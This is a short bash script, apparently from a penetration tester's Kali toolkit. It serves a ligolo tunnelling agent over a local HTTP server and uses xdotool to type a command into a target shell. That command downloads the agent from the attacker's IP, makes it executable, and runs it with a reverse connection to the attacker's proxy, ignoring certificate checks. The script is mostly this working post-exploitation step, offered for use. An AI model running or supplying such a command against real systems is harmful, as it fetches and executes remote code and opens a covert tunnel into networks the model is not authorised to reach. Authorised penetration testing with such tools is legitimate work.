#!/bin/bash

: '
download ligolo agent to server and connect to proxy
'

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh
source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh

# Generate gui form
generate_form "Http port"

HTTP_PORT=${form_data["Http port"]}

cd ~/Desktop/base/code/xdotool/scripts/portListening/.files
python3 -m http.server ${HTTP_PORT} &
HTTP_PID=$!

paste_command "curl http://${KALI_IP}:${HTTP_PORT}/agent -o /tmp/agent && chmod +x /tmp/agent && cd /tmp && ls -alF /tmp && /tmp/agent -connect ${KALI_IP}:11601 -ignore-cert"
xdotool key Return
sleep 10

kill $HTTP_PID